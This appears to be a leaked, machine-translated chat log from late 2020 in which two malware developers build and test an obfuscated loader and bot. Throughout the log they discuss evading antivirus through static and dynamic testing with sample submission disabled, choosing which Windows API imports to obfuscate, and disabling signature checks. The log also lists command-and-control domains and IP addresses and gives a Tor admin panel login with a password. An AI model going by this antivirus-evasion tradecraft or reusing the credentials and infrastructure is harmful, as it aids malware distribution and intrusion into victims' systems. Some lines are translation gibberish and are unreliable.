I don't have

2020-10-23T15:40:46 mushroom -> price
And there you can write value = input("Hello\n")

2020-10-23T15:40:53 mushroom -> price
Enter World

2020-10-23T15:41:23 mushroom -> price
Write value, you will get World, what you entered.

2020-10-23T15:41:35 price -> mushroom
thanks

2020-10-27T08:27:23 mushroom -> price
Hi you can wait for now, if you have finished and obfuscated everything.

2020-10-27T08:27:44 mushroom -> price
Until the new server made the account.

2020-10-27T08:28:38 price -> mushroom
ok

2020-10-27T08:29:31 price -> mushroom
Do you have any working gaskets?

2020-10-27T08:29:38 price -> mushroom
?

2020-10-27T08:30:19 mushroom -> price
None.

2020-10-27T08:30:36 price -> mushroom
let's wait

2020-11-02T14:20:24 mushroom -> price
Hi. Do you have a backup account for communication? If not, create one and give it to Defender.

2020-11-02T14:21:13 price -> mushroom
I passed on

2020-11-03T08:51:19 mushroom -> price
Hi.

2020-11-03T08:51:21 mushroom -> price
dyncheck.com
benalen@exploit.im
DH*&HKDbs*&TGLksg87whnw40utji$

2020-11-03T08:51:46 price -> mushroom
Hi

2020-11-03T08:51:58 price -> mushroom
Thank you, did the git and servers work?

2020-11-03T08:52:16 mushroom -> price
Check there your obfuscated programs statically and dynamically. Clean it up if you need.

2020-11-03T08:52:28 price -> mushroom
ok

2020-11-03T08:52:34 mushroom -> price
No.

2020-11-03T08:53:13 mushroom -> price
When you check statically don't enable windows defender cloud, it is not enabled by default.

2020-11-03T08:53:55 mushroom -> price
When you check dynamically don't enable internet connection, it's block by default.

2020-11-03T08:57:35 price -> mushroom
komodo wrote the first Dynamic detect

2020-11-03T08:57:45 price -> mushroom
others are in progress

2020-11-03T08:58:47 mushroom -> price
Wait until they're all gone. Komodo writes on everything there.

2020-11-03T08:59:19 price -> mushroom
ok

2020-11-03T09:06:14 price -> mushroom
runtime AV check except komodo - all wedge

2020-11-03T09:06:56 mushroom -> price
Both the loader and the bot?

2020-11-03T09:07:11 price -> mushroom
lowader only

2020-11-03T09:07:34 price -> mushroom
bot has not been obfuscated yet

2020-11-03T09:07:39 price -> mushroom
I'll put it on today

2020-11-03T09:07:53 mushroom -> price
Check everything statically, too.

2020-11-03T09:08:02 price -> mushroom
static check also 0/31

2020-11-03T09:08:24 price -> mushroom
Yes, and before the anhook is put

2020-11-03T09:08:29 price -> mushroom
I'll put it up today

2020-11-03T09:08:33 price -> mushroom
I'll put

2020-11-05T12:51:22 PM mushroom -> price
Hi.
https://ga72jrqnrjhsn6vi.onion:4247/sOIDFhsAIUfhu42332uygt27634ft7yuaFGyaugkJFsayjegf--_-GBASfdvt23fv/index.php?r=site%2Findex
Login: b2_1
Password: +gXjH[ovqDf8qq4}~E
Group: prtest

2020-11-05T12:51:42 mushroom -> price
Pour everything in there.

2020-11-05T12:51:51 mushroom -> price
Check all the compnds.

2020-11-05T12:51:51 price -> mushroom
Hi, just in time

2020-11-05T12:52:06 price -> mushroom
ok

2020-11-05T12:53:24 mushroom -> price
Bot: https://zxeta.com:443,https://njhbbj.net:443

2020-11-05T12:54:02 mushroom -> price
Downloader: https://rdtvhbj.com:443,https://btyvkjbn.com:443,https://oihgb.com:443

2020-11-05T12:54:12 price -> mushroom
ok

2020-11-05T12:54:29 mushroom -> price
Only there's no address anywhere.

2020-11-05T12:54:53 mushroom -> price
Sending samples should be turned off when testing.

2020-11-05T12:54:55 price -> mushroom
What is the light?

2020-11-05T12:55:06 mushroom -> price
Sending samples.

2020-11-05T12:55:22 price -> mushroom
Where is she?

2020-11-05T12:55:32 price -> mushroom
And when checking in dincheck

2020-11-05T12:55:37 mushroom -> price
Do not use VirusTotal or anything like it.

2020-11-05T12:55:49 price -> mushroom
I'm in dincheck with the cloud off

2020-11-05T12:56:14 mushroom -> price
Check in dyncheck only when everything is 100% error free.

2020-11-05T12:57:00 mushroom -> price
Static dyncheck does not drain anything, and dynamic is questionable, for this Internet connection there in the settings Block.

2020-11-05T12:57:16 price -> mushroom
I see, then I will check the statics in the VM with avast

2020-11-05T12:57:45 mushroom -> price
First, make sure that all commands work without errors.

2020-11-05T12:57:46 price -> mushroom
and the EUETE.

2020-11-05T12:57:56 price -> mushroom
ok

2020-11-09T08:19:58 mushroom -> price
Hi. What's up?

2020-11-09T08:24:04 price -> mushroom
while I'm working

2020-11-09T08:24:13 price -> mushroom
Trying to put the hooks

2020-11-09T08:24:40 price -> mushroom
But it might not be that hard, I'm organizing the library

2020-11-09T08:25:05 mushroom -> price
Why put the hooks in?

2020-11-09T08:25:14 mushroom -> price
There's no such thing in the ToR.

2020-11-09T08:25:22 price -> mushroom
Well, it was in the modules.

2020-11-09T08:25:26 price -> mushroom
from antivirus

2020-11-09T08:25:37 price -> mushroom
I thought this was a must.

2020-11-09T08:26:05 mushroom -> price
The tests do not show up on dyncheck.

2020-11-09T08:26:08 price -> mushroom
Then I'll upload it to the loader's admin today (it passed the AB tests)

2020-11-09T08:26:18 mushroom -> price
You have to give it to work.

2020-11-09T08:26:32 mushroom -> price
Did you check all the commands?

2020-11-09T08:26:34 price -> mushroom
I mean, if it's not stolen, then it's valuable?

2020-11-09T08:26:56 price -> mushroom
I'm going to try it again (at work)

2020-11-09T08:27:00 mushroom -> price
I mean, you can give it to work.

2020-11-09T08:27:26 mushroom -> price
You'll have to do the improvements paparely.

2020-11-09T08:27:37 mushroom -> price
Check all the commands.

2020-11-09T08:27:47 price -> mushroom
ok

2020-11-09T08:30:27 mushroom -> price
How to check the bootloader binary without logs, obfuscated, send me.

2020-11-09T08:30:53 mushroom -> price
If you need addresses, write.

2020-11-09T08:30:54 price -> mushroom
sorts?

2020-11-09T08:31:04 mushroom -> price
Binary.

2020-11-09T08:31:04 price -> mushroom
so right away we need

2020-11-09T08:31:09 price -> mushroom
how to check

2020-11-09T08:31:16 price -> mushroom
writing

2020-11-09T08:31:24 mushroom -> price
bot
3.86.163.159
3.91.47.199

loader
3.15.220.79
3.139.97.6
18.236.63.179

2020-11-09T08:31:28 price -> mushroom
thanks

2020-11-10T07:58:14 mushroom -> price
Hi. Did you check it out?

2020-11-10T08:03:01 price -> mushroom
I'm testing the bot now.

2020-11-10T08:03:10 price -> mushroom
Hi

2020-11-10T08:04:22 price -> mushroom
Is the git still up for grabs?

2020-11-10T08:04:53 mushroom -> price
They're starting to do it. I did.

2020-11-10T08:05:25 price -> mushroom
I'll check the bot and tell you right away, not much left

2020-11-10T08:06:16 mushroom -> price
OK.

2020-11-10T11:20:04 price -> mushroom
I can't connect to the Lowder servers

2020-11-10T11:20:12 price -> mushroom
got any new gaskets?

2020-11-10T11:22:03 mushroom -> price
bot
54.202.82.138
52.37.88.45

loader
18.188.120.36
3.138.35.230
54.174.190.230

2020-11-10T11:22:23 price -> mushroom
thanks

2020-11-11T08:52:45 mushroom -> price
Hi. How was it?

2020-11-11T08:53:17 price -> mushroom
My cryptor fell off, I'm repairing it

2020-11-11T08:53:45 price -> mushroom
For some reason it crashes at the action, although everything seems to be fine in the parameters

2020-11-11T08:54:25 PM mushroom -> price
What kind of cryptor?

2020-11-11T08:54:35 mushroom -> price
Signature check?

2020-11-11T08:54:43 price -> mushroom
yes

2020-11-11T08:54:58 mushroom -> price
Maybe the signature isn't there?

2020-11-11T08:55:14 price -> mushroom
it worked all the time in the bot, it was moved to the loader and now it has fallen off.

2020-11-11T08:55:30 price -> mushroom
I will try the bot again. Or replace it with another one

2020-11-11T08:55:53 price -> mushroom
it's in the early stages -- it's not even close to signing.

2020-11-11T08:55:58 mushroom -> price
Is there a signature?

2020-11-11T08:56:22 price -> mushroom
BCryptImportKeyPair

2020-11-11T08:56:34 price -> mushroom
from the admin area?

2020-11-11T08:56:39 price -> mushroom
it's all there

2020-11-11T08:57:05 mushroom -> price
Is it checked?

2020-11-11T08:57:07 price -> mushroom
I'll figure it out, I don't have a problem-it's a general shake-up

2020-11-11T08:57:31 price -> mushroom
admin? Yes from it comes 200 and everything you need

2020-11-11T08:58:14 mushroom -> price
Is the signature checked with a key?

2020-11-11T08:58:34 price -> mushroom
yes, private

2020-11-11T08:58:41 price -> mushroom
1014 bytes

2020-11-11T08:58:44 price -> mushroom
104

2020-11-11T08:59:01 price -> mushroom
man. public

2020-11-11T09:01:10 price -> mushroom

you better tell me how to make typedef for function typedef int(WINAPI* user32wsprintfA_)(LPSTR, LPCSTR, va_list arglist);

2020-11-11T09:01:22 price -> mushroom
this one does not work because the function has a prototype

2020-11-11T09:01:35 price -> mushroom
dots

2020-11-11T09:01:35 price -> mushroom
int WINAPIV wsprintfA(
  LPSTR ,
  LPCSTR ,
  ...    
);

2020-11-11T09:02:31 price -> mushroom
I want to getprocaddress and refer to this function through getprocaddress and can't protapdefy it

2020-11-11T09:03:08 price -> mushroom
similar function has an arglist there

2020-11-11T09:03:11 price -> mushroom
int wvsprintfA(
  LPSTR ,
  LPCSTR ,
  va_list arglist
);

2020-11-11T09:04:12 mushroom -> price
I don't know about the dots.

2020-11-11T09:04:44 price -> mushroom
this is the last function I have left in my symbols

2020-11-11T09:04:59 price -> mushroom
maybe keep the symbole?

2020-11-11T09:04:59 price -> mushroom
maybe keep the symbole?

2020-11-11T09:06:19 mushroom -> price
Such functions don't need to be obfuscated.

2020-11-11T09:06:47 mushroom -> price
You can overdo it and it will look suspicious to antivirus.

2020-11-11T09:07:43 price -> mushroom
Which ones do you need? That's what I thought too. What's too polished is 100% a pointer to maliciousness.

2020-11-11T09:08:34 price -> mushroom
And what is the criterion - who to weed out from the Imports

2020-11-11T09:10:03 mushroom -> price
Suspicious like anything in Wininet related to processes, encryption, etc.

2020-11-11T09:11:48 mushroom -> price
I don't obfuscate string functions, and HeapAlloc, HeapFree functions. If something needs to close the CloaseHandle and it was opened by an obfuscated function, then CloseHadle needs to be obfuscated too.

2020-11-11T09:12:09 PM mushroom -> price
If not, don't. It won't be suspicious that way.

2020-11-11T09:13:55 price -> mushroom
I remembered why I used a link to get the sprintf analog - wsprintfA

2020-11-12T08:16:18 mushroom -> price
Hi. What's up?

2020-11-12T08:18:22 price -> mushroom
on crypt32 I found the cause (the function variable was null, instead of bcrypt trying to download from crypt32)

2020-11-12T08:18:51 mushroom -> price
Did you check all the commands?

2020-11-12T08:19:25 price -> mushroom
But then when exiting the crypt in the loop writes some exceptions. Really not getting there now maybe the pads have changed

2020-11-12T08:20:37 mushroom -> price
loader
195.123.243.19
 45.148.120.184
 195.123.243.20

bot
 85.204.116.179
66.85.173.10

2020-11-12T08:20:55 mushroom -> price
How much more will you check?

2020-11-12T08:20:58 price -> mushroom
went to check commands

2020-11-12T08:21:06 price -> mushroom
I'll check on that today.

2020-11-12T08:22:00 mushroom -> price
Me, send me the bootloader binary when you check it. In the combat version (Release_nologs).

2020-11-12T08:22:16 price -> mushroom
ok

2020-11-12T09:48:23 mushroom -> price
Change the addresses of the bots:
loader
195.123.243.19
 45.148.120.184
 195.123.243.20

bot
 34.239.246.132
54.196.129.197

2020-11-12T09:48:38 price -> mushroom
thanks

2020-11-12T12:57:36 price -> mushroom
hi

2020-11-12T12:58:05 price -> mushroom
there is no connection to the prtest group on bots

2020-11-12T12:58:23 price -> mushroom
error 12029 cannot connect

2020-11-12T12:58:42 price -> mushroom
Maybe something has changed (the port, for example)?

2020-11-12T12:59:47 price -> mushroom
and by loaders no signature verification, no matter how twisted the software, which on the old admin worked like clockwork (without a signature from now on everything works)

2020-11-12T13:00:52 price -> mushroom
For bots here there is no connection BOOL bSend = HttpSendRequestA(hRequest, cookies, icookieslen, NULL, 0);

2020-11-12T13:02:10 price -> mushroom
Cookie: group = prtest

2020-11-12T13:02:41 PM mushroom -> price
Was it yesterday? Was the signature checked yesterday?

2020-11-12T13:03:12 price -> mushroom
I didn't get to that place yesterday

2020-11-12T13:04:17 price -> mushroom
But the code is all in place, which was working. Just put addresses on WinApi instead of Import functions

2020-11-12T13:05:01 price -> mushroom
hfymit ujdjhbkb xnj ytn dthbabrfwbb b ldbufqcz lfdkmit? xnj z b cltkfk ctqxfc

2020-11-12T13:05:38 price -> mushroom
with verification still ok, they used to say no and move on

2020-11-12T13:05:43 mushroom -> price
And the day before yesterday?

2020-11-12T13:05:53 price -> mushroom
But with the bot - the problem.

2020-11-12T13:06:39 price -> mushroom
I changed the function names to references to these functions a long time ago and poked around with debugging, there were no runs

2020-11-12T13:07:29 price -> mushroom
Now I'll try to look for the version before the links, I'll substitute the ipi and try it

2020-11-12T13:07:43 price -> mushroom
But what about the bots?

2020-11-12T13:08:26 mushroom -> price
Check the signature.

2020-11-12T13:09:59 price -> mushroom
NTSTATUS status = bcryptBCryptVerifySignature(m_key, NULL, hash, hashSize, sign, signSize, 0);

2020-11-12T13:10:24 price -> mushroom
everything has been tracked to this point as it is transmitted

2020-11-12T13:10:59 price -> mushroom
STATUS_INVALID_SIGNATURE status

2020-11-12T13:11:12 price -> mushroom
something about the signature

2020-11-12T13:11:57 mushroom -> price
The key must have changed. Then disable signature verification for now.

2020-11-12T13:12:05 mushroom -> price
Check everything else.

2020-11-12T13:12:13 price -> mushroom
I'm thinking the same thing

2020-11-12T13:12:32 price -> mushroom
But the rest is holoving on the bot. and the bot doesn't work out

2020-11-12T13:12:41 price -> mushroom
Maybe something has changed too?

2020-11-12T13:13:31 price -> mushroom
Anyway, I'm debugging the bot now. Loider except for the signature seems to work

2020-11-12T13:13:33 mushroom -> price
Uncheck bot's signature check, too.

2020-11-12T13:14:58 price -> mushroom
ok

2020-11-13T08:42:27 mushroom -> price
Hi. How's the testing going?

2020-11-13T08:42:44 price -> mushroom
is in full swing

2020-11-13T08:43:21 price -> mushroom
[11:39:32] <PRICE> hi. Said you're an experienced consultant.
[11:39:57] <van> Hi! )))
[11:40:17] <PRICE> my bot gets command 0 302 with cookie: group = prtest
[11:40:31] <PRICE> and there's nothing in the bot list in the admin. What could it be?
[11:40:43] <PRICE> pads verified.
[11:41:08] <PRICE> working with WAPN - american
[11:41:58] <PRICE> it used to work fine on old admin, I didn't change anything
[11:42:13] <PRICE> only public key for verification
[11:42:26] <PRICE> and addresses of pads
[11:42:37] <van> is there such a group prtest? Is it open?
[11:42:56] <van> if you got 302 - you're fine
[11:43:02] <PRICE> and how to open it, it's in the list of groups in the admin

2020-11-13T08:43:56 price -> mushroom
And there's nothing wrong with the lowder.

2020-11-13T08:44:06 price -> mushroom
functionality restored

2020-11-13T08:46:31 price -> mushroom
bot debugging

2020-11-13T08:47:00 price -> mushroom
green and van help with tips (green removes locks, gives pads)

2020-11-13T08:47:23 mushroom -> price
Yeah. He gives all the addresses.

2020-11-13T08:47:49 price -> mushroom
he can also look in the logs of the connections

2020-11-13T08:47:58 price -> mushroom
I have all the connections, but no bounce

2020-11-13T08:48:01 price -> mushroom
I'm worried

2020-11-13T08:49:48 price -> mushroom
Yes, I also got a git and a new chat room

2020-11-13T08:50:24 price -> mushroom
But there's no bouncing.

2020-11-13T08:51:11 mushroom -> price
Let me check on my bot.

2020-11-13T08:51:25 mushroom -> price
In the new chat room, give me your nickname.

2020-11-13T08:51:30 price -> mushroom
the main forces have arrived!

2020-11-13T08:51:37 mushroom -> price
We'll communicate there.

2020-11-13T08:52:19 price -> mushroom
marlin

2020-11-13T08:53:22 mushroom -> price
Emailed you.

2020-11-13T08:53:41 price -> mushroom
how's the piano?

2020-11-13T08:53:49 mushroom -> price
Yes.

2020-11-13T08:54:00 mushroom -> price
Answer.

2020-11-13T08:54:01 price -> mushroom
where to read?

2020-11-13T08:54:46 price -> mushroom
can't see anything

2020-11-13T09:16:07 mushroom -> price
They're setting something up on the server there.

2020-11-13T09:17:18 mushroom -> price
Is your chat room working?

2020-11-13T09:31:40 price -> mushroom
this one

2020-11-13T09:31:47 price -> mushroom
all chats are working

2020-11-13T09:32:54 mushroom -> price
It didn't work for me.

2020-11-13T09:33:20 price -> mushroom
Friday, 13

2020-11-13T09:33:59 mushroom -> price
Yes.

2020-11-13T09:34:13 mushroom -> price
The main chat room is now that one, this one they say is dirty.

2020-11-13T09:34:17 price -> mushroom
bouza knocked on the rocket

2020-11-13T09:34:29 price -> mushroom
he's silver

2020-11-13T09:34:39 mushroom -> price
Yes.

2020-11-13T09:36:26 price -> mushroom
there's even some kind of alphonse

